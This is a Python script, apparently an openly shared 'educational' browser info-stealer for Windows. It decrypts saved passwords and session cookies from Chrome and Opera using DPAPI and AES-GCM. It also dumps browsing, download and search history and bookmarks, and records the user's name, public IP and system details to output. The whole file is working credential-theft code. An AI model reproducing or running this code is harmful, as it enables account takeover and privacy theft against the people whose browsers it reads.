import os, json, base64, sqlite3, win32crypt, shutil, ctypes, getpass, requests, platform, subprocess, time

from Crypto.Cipher import AES

from datetime import timezone, datetime, timedelta

#Usage :getbrowserinfoprintmode.py > output.txt

#Google Chrome Password Script Source : https://www.thepythoncode.com/article/extract-chrome-passwords-python

#Coded By Kral4 | https://github.com/rootkral4

#Educational Purposes Only

#https://github.com/rootkral4/browserinfogather/blob/main/LICENSE



# You should have received a copy of the MIT License

# along with this program.  If not, see <https://github.com/rootkral4/browserinfogather/blob/main/LICENSE>.





def get_chrome_datetime(chromedate):

    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)



def get_encryption_key():

    local_state_path = os.path.join(os.environ["USERPROFILE"],

                                    "AppData", "Local", "Google", "Chrome",

                                    "User Data", "Local State")

    with open(local_state_path, "r", encoding="utf-8") as f:

        local_state = f.read()

        local_state = json.loads(local_state)



    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

    key = key[5:]

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    

def get_opera_encryption_key():

    local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Roaming", "Opera Software", "Opera Stable","Local State")

    with open(local_state_path, "r", encoding="utf-8") as f:

        local_state = f.read()

        local_state = json.loads(local_state)



    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

    key = key[5:]

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    

def decrypt_password(password, key):

    try:

        iv = password[3:15]

        password = password[15:]

        cipher = AES.new(key, AES.MODE_GCM, iv)

        return cipher.decrypt(password)[:-16].decode()

    except:

        try:

            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])

        except:

            return ""

            

def chrome():

    key = get_encryption_key()

    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "Login Data")

    filename = "ChromeData.db"

    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)

    cursor = db.cursor()

    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

    googletag = "*"*15+"Google"+"*"*15

    print(googletag)

    for row in cursor.fetchall():

        origin_url = row[0]

        action_url = row[1]

        username = row[2]

        password = decrypt_password(row[3], key)

        date_created = row[4]

        date_last_used = row[5]   

        if username or password:

            print("Origin URL:",origin_url,"\n")

            print("Action URL:"+action_url+"\n")

            print("Username :"+username+"\n")

            print("Password :"+password+"\n")

        else:

            continue

        if date_created != 86400000000 and date_created:

            print("Creation Date :"+str(get_chrome_datetime(date_created))+"\n")

        if date_last_used != 86400000000 and date_last_used:

            print("Last Used Date :"+str(get_chrome_datetime(date_last_used))+"\n")

        print("================================\n")

    cursor.close()

    db.close()

    try:

        os.remove(filename)

    except:

        pass



def chromehistory():

    historypath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "History")

    filename = "ChromeHistoryData.db"

    shutil.copyfile(historypath, filename)

    db = sqlite3.connect(filename)

    cursor = db.cursor()

    cursor.execute("select url, title, visit_count, typed_count, last_visit_time from urls order by last_visit_time")

    print("**********Google History*********\n")

    for row in cursor.fetchall():

        url = row[0]

        title = row[1]

        visit_count = row[2]

        typed_count = row[3]

        last_visit_time = row[4]

        if url or title:

            print("URL :"+url+"\n")

            print("Title :"+title+"\n")

            print("Visit Count :"+str(visit_count)+"\n")

            print("Typed Count :"+str(typed_count)+"\n")

        else:

            continue

        if last_visit_time != 86400000000 and last_visit_time:

            print("Last Visit Time :"+str(get_chrome_datetime(last_visit_time))+"\n")

        print("================================\n")

    cursor.close()

    db.close()   

    try:

        os.remove(filename)

    except Exception as ex:
        print("ChromeHistoryData.db not removed",str(ex))
        pass



def chromedownloadhistory():

    historypath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "History")

    filename = "ChromeHistoryData.db"

    shutil.copyfile(historypath, filename)

    db = sqlite3.connect(filename)

    cursor = db.cursor()

    cursor.execute("select guid, current_path, target_path, start_time, received_bytes, total_bytes, state, danger_type, interrupt_reason, end_time, opened, last_access_time, referrer, site_url, tab_url, tab_referrer_url, etag, last_modified,mime_type,original_mime_type from downloads order by start_time")

    print("**********Google Download History*********\n")

    for row in cursor.fetchall():

        guid = row[0]

        current_path = row[1]

        target_path = row[2]

        start_time = row[3]

        received_bytes = row[4]

        total_bytes = row[5]

        state = row[6]

        danger_type = row[7]

        interrupt_reason = row[8]

        end_time = row[9]

        opened = row[10]

        last_access_time = row[11]

        referrer = row[12]

        site_url = row[13]

        tab_url = row[14]

        tab_referrer_url = row[15]

        etag = row[16]

        last_modified = row[17]

        mime_type = row[18]

        original_mime_type = row[19]

        if guid or original_mime_type:

            print("Guid :"+str(guid)+"\n")

            print("Current Path :"+str(current_path)+"\n")

            print("Target Path :"+str(target_path)+"\n")

            print("Received Bytes :"+str(received_bytes)+"\n")

            print("Total Bytes :"+str(total_bytes)+"\n")

            print("State :"+str(state)+"\n")

            print("Danger Type :"+str(danger_type)+"\n")

            print("Interrupt Reason :"+str(interrupt_reason)+"\n")

            print("Opened :"+str(opened)+"\n")

            print("Referrer :"+str(referrer)+"\n")

            print("Site Url ::"+str(site_url)+"\n")

            print("Tab Url :"+str(tab_url)+"\n")

            print("Tab Referrer Url :"+str(tab_referrer_url)+"\n")

            print("Last Modified :"+str(last_modified)+"\n")

            print("Mime Type:"+str(mime_type)+"\n")

            print("Original Mime Type:"+str(original_mime_type)+"\n")

        else:

            continue

        if start_time != 86400000000 and start_time:

            print("Start Time :"+str(get_chrome_datetime(start_time))+"\n")

        if end_time != 86400000000 and end_time:

            print("End Time :"+str(get_chrome_datetime(end_time))+"\n")  

        if last_access_time != 86400000000 and last_access_time:

            print("Last Access Time :"+str(get_chrome_datetime(last_access_time))+"\n")  

        print("================================\n")

    cursor.close()

    db.close()   

    try:

        os.remove(filename)

    except:

        pass



def chromesearchtermshistory():

    historypath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "History")

    filename = "ChromeHistoryData.db"

    shutil.copyfile(historypath, filename)

    db = sqlite3.connect(filename)

    cursor = db.cursor()

    cursor.execute("select term, normalized_term from keyword_search_terms order by keyword_id")

    print("**********Google Search Term History*********\n")

    for row in cursor.fetchall():

        term = row[0]

        normalized_term = row[1]

        if term or normalized_term:

            print("Term :"+str(term)+"\n")

            print("Normalized Term :"+str(normalized_term)+"\n")

            print("================================\n")

        else:

            continue

    cursor.close()

    db.close()   

    try:

        os.remove(filename)

    except:

        pass  



def googlecookies():

    key = get_encryption_key()

    cookiespath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "Cookies")

    filename = "GoogleCookieData.db"

    shutil.copyfile(cookiespath, filename)

    db = sqlite3.connect(filename)

    cursor = db.cursor()

    cursor.execute("select creation_utc,host_key,name,value,path,expires_utc,is_secure,is_httponly,last_access_utc,has_expires,is_persistent,priority,encrypted_value,samesite,source_scheme from cookies order by creation_utc")

    print("**********Google Cookies*********\n")

    for row in cursor.fetchall():

        creation_utc = row[0]

        host_key = row[1]

        name = row[2]

        value = row[3]

        path = row[4]

        expires_utc = row[5]

        is_secure = row[6]

        is_httponly = row[7]

        last_access_utc = row[8]

        has_expires = row[9]

        is_persistent = row[10]

        priority = row[11]

        encrypted_value = decrypt_password(row[12], key) 

        samesite = row[13]

        source_scheme = row[14]

        if encrypted_value:

            print("Cookie :"+str(encrypted_value)+"\n")

            print("Host Key :"+str(host_key)+"\n")

            print("Name :"+str(name)+"\n")

            print("Value :"+str(value)+"\n")

            print("Path :"+str(path)+"\n")

            print("isSecure :"+str(is_secure)+"\n")

            print("isHttponly :"+str(is_httponly)+"\n")

            print("Has Expires :"+str(has_expires)+"\n")

            print("is Persistent :"+str(is_persistent)+"\n")

            print("Priority :"+str(priority)+"\n")

            print("Same Site :"+str(samesite)+"\n")

            print("Source Scheme:"+str(source_scheme)+"\n")

        else:

            continue

        if creation_utc != 86400000000 and creation_utc:

            print("Creation Date :"+str(get_chrome_datetime(creation_utc))+"\n")

        if expires_utc != 86400000000 and expires_utc:

            print("Expiry Date :"+str(get_chrome_datetime(expires_utc))+"\n")

        if last_access_utc != 86400000000 and last_access_utc:

            print("Last Access Date :"+str(get_chrome_datetime(last_access_utc))+"\n")

        print("================================\n")

    cursor.close()

    db.close()

    try:

        os.remove(filename)

    except:

        pass        



def googlebookmarks():

    bookmarkspath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "Bookmarks")

    print("**********Google Bookmarks*********\n")

    with open(bookmarkspath,"r") as f:

        data = json.load(f)

    print(str(data)+'\n')

    print("================================\n")

    

def opera():

    key = get_opera_encryption_key()

    db_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Roaming", "Opera Software", "Opera Stable","Login Data")

    filename = "OperaData.db"

    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)

    cursor = db.cursor()

    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

    operatag = "*"*15+"Opera"+"*"*15

    print(str(operatag)+"\n")

    for row in cursor.fetchall():

        origin_url = row[0]

        action_url = row[1]

        username = row[2]

        password = decrypt_password(row[3], key)

        date_created = row[4]

        date_last_used = row[5]   

        if username or password:

            print("Origin URL:"+origin_url+"\n")

            print("Action URL:"+action_url+"\n")

            print("Username :"+username+"\n")

            print("Password :"+password+"\n")

        else:

            continue

        if date_created != 86400000000 and date_created:

            print("Creation Date :"+str(get_chrome_datetime(date_created))+"\n")

        if date_last_used != 86400000000 and date_last_used:

            print("Last Used Date :"+str(get_chrome_datetime(date_last_used))+"\n")

        print("================================\n")

    cursor.close()

    db.close()

    try:

        os.remove(filename)

    except:

        pass



def operadownloadhistory():

    historypath = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable","History")

    filename = "OperaHistoryData.db"

    shutil.copyfile(historypath, filename)

    db = sqlite3.connect(filename)

    cursor = db.cursor()

    cursor.execute("select guid, current_path, target_path, start_time, received_bytes, total_bytes, state, danger_type, interrupt_reason, end_time, opened, last_access_time, referrer, site_url, tab_url, tab_referrer_url, etag, last_modified,mime_type,original_mime_type from downloads order by start_time")

    print("**********Opera Download History*********\n")

    for row in cursor.fetchall():

        guid = row[0]

        current_path = row[1]

        target_path = row[2]

        start_time = row[3]

        received_bytes = row[4]

        total_bytes = row[5]

        state = row[6]

        danger_type = row[7]

        interrupt_reason = row[8]

        end_time = row[9]

        opened = row[10]

        last_access_time = row[11]

        referrer = row[12]

        site_url = row[13]

        tab_url = row[14]

        tab_referrer_url = row[15]

        etag = row[16]

        last_modified = row[17]

        mime_type = row[18]

        original_mime_type = row[19]

        if guid or original_mime_type:

            print("Guid :"+str(guid)+"\n")

            print("Current Path :"+str(current_path)+"\n")

            print("Target Path :"+str(target_path)+"\n")

            print("Received Bytes :"+str(received_bytes)+"\n")

            print("Total Bytes :"+str(total_bytes)+"\n")

            print("State :"+str(state)+"\n")

            print("Danger Type :"+str(danger_type)+"\n")

            print("Interrupt Reason :"+str(interrupt_reason)+"\n")

            print("Opened :"+str(opened)+"\n")

            print("Referrer :"+str(referrer)+"\n")

            print("Site Url ::"+str(site_url)+"\n")

            print("Tab Url :"+str(tab_url)+"\n")

            print("Tab Referrer Url :"+str(tab_referrer_url)+"\n")

            print("Last Modified :"+str(last_modified)+"\n")

            print("Mime Type:"+str(mime_type)+"\n")

            print("Original Mime Type:"+str(original_mime_type)+"\n")

        else:

            continue

        if start_time != 86400000000 and start_time:

            print("Start Time :"+str(get_chrome_datetime(start_time))+"\n")

        if end_time != 86400000000 and end_time:

            print("End Time :"+str(get_chrome_datetime(end_time))+"\n")  

        if last_access_time != 86400000000 and last_access_time:

            print("Last Access Time :"+str(get_chrome_datetime(last_access_time))+"\n")  

        print("================================\n")

    cursor.close()

    db.close()   

    try:

        os.remove(filename)

    except:

        pass



def operasearchtermshistory():

    historypath = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable","History")

    filename = "OperaHistoryData.db"

    shutil.copyfile(historypath, filename)

    db = sqlite3.connect(filename)

    cursor = db.cursor()

    cursor.execute("select term, normalized_term from keyword_search_terms order by keyword_id")

    print("\n**********Opera Search Term History*********\n")

    for row in cursor.fetchall():

        term = row[0]

        normalized_term = row[1]

        if term or normalized_term:

            print("Term :"+str(term)+"\n")

            print("Normalized Term :"+str(normalized_term)+"\n")

        else:

            continue

        print("================================\n")

    cursor.close()

    db.close()   

    try:

        os.remove(filename)

    except:

        pass  

        

def operacookies():

    key = get_opera_encryption_key()

    cookiespath = os.path.join(os.environ["USERPROFILE"],"AppData", "Roaming", "Opera Software", "Opera Stable","Cookies")

    filename = "OperaCookieData.db"

    shutil.copyfile(cookiespath, filename)

    db = sqlite3.connect(filename)

    cursor = db.cursor()

    cursor.execute("select creation_utc,host_key,name,value,path,expires_utc,is_secure,is_httponly,last_access_utc,has_expires,is_persistent,priority,encrypted_value,samesite,source_scheme from cookies order by creation_utc")

    print("**********Opera Cookies*********\n")

    for row in cursor.fetchall():

        creation_utc = row[0]

        host_key = row[1]

        name = row[2]

        value = row[3]

        path = row[4]

        expires_utc = row[5]

        is_secure = row[6]

        is_httponly = row[7]

        last_access_utc = row[8]

        has_expires = row[9]

        is_persistent = row[10]

        priority = row[11]

        encrypted_value = decrypt_password(row[12], key) 

        samesite = row[13]

        source_scheme = row[14]

        if encrypted_value:

            print("Cookie :"+str(encrypted_value)+"\n")

            print("Host Key :"+str(host_key)+"\n")

            print("Name :"+str(name)+"\n")

            print("Value :"+str(value)+"\n")

            print("Path :"+str(path)+"\n")

            print("isSecure :"+str(is_secure)+"\n")

            print("isHttponly :"+str(is_httponly)+"\n")

            print("Has Expires :"+str(has_expires)+"\n")

            print("is Persistent :"+str(is_persistent)+"\n")

            print("Priority :"+str(priority)+"\n")

            print("Same Site :"+str(samesite)+"\n")

            print("Source Scheme:"+str(source_scheme)+"\n")

        else:

            continue

        if creation_utc != 86400000000 and creation_utc:

            print("Creation Date :"+str(get_chrome_datetime(creation_utc))+"\n")

        if expires_utc != 86400000000 and expires_utc:

            print("Expiry Date :"+str(get_chrome_datetime(expires_utc))+"\n")

        if last_access_utc != 86400000000 and last_access_utc:

            print("Last Access Date :"+str(get_chrome_datetime(last_access_utc))+"\n")

        print("================================\n")

    cursor.close()

    db.close()

    try:

        os.remove(filename)

    except:

        pass



def operabookmarks():

    bookmarkspath = os.path.join(os.environ["USERPROFILE"],"AppData", "Roaming", "Opera Software", "Opera Stable","Bookmarks")

    print("**********Opera Bookmarks*********\n")

    with open(bookmarkspath,"r") as f:

        data = json.load(f)

    print(str(data)+'\n')

    print("================================\n")

    



if __name__ == "__main__":

    try:

        r = requests.get("https://ifconfig.me")

        systeminfo = platform.uname()

        print("Username :"+getpass.getuser()+"\n")

        print("IP Address :"+r.text+"\n")

        print("System :"+systeminfo.system+"\n")

        print("Name :"+systeminfo.node+"\n")

        print("Release :"+systeminfo.release+"\n")

        print("Version :"+systeminfo.version+"\n")

        print("Machine :"+systeminfo.machine+"\n")

        print("Processor :"+systeminfo.processor+"\n")

        Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')

        new = []

        for item in Id:

            new.append(str(item.split("\r")[:-1]))

        for i in new:

            print(i[2:-2]+"\n")

    except:

        pass

    try:

        chrome()

    except Exception as ex:

        print("Google Saved Password - Something Went Wrong"+str(ex))

        pass

    try:
        time.sleep(0.5)
        chromehistory()

    except Exception as ex:

        print("Google History - Something Went Wrong"+str(ex))

        pass

    try:

        chromedownloadhistory()

    except Exception as ex:

        print("Google Download History - Something Went Wrong"+str(ex))

        pass

    try:

        chromesearchtermshistory()

    except Exception as ex:

        print("Google Search Term History - Something Went Wrong"+str(ex))

        pass

    time.sleep(1)

    try:

        googlecookies()

    except Exception as ex:

        print("Google Cookies - Something Went Wrong"+str(ex))

        pass

    try:

        googlebookmarks()

    except Exception as ex:

        print("Google Bookmarks - Something Went Wrong"+str(ex))

        pass

    try:

        opera()

    except Exception as ex:

        print("Opera Saved Password - Something Went Wrong"+str(ex))

        pass

    try:

        operadownloadhistory()

    except Exception as ex:

        print("Opera Download History - Something Went Wrong"+str(ex))

        pass

    try:

        operasearchtermshistory()

    except Exception as ex:

        print("Opera Search Term History - Something Went Wrong"+str(ex))

        pass

    try:

        operacookies()

    except Exception as ex:

        print("Opera Cookies - Something Went Wrong"+str(ex))

        pass

    try:

        operabookmarks()

    except Exception as ex:

        print("Opera Bookmarks - Something Went Wrong"+str(ex))

        pass

    time.sleep(0.5)
    try:
        os.remove("ChromeHistoryData.db")
    except:
        pass
    try:

        print("ALL DONE")

    except:

        pass


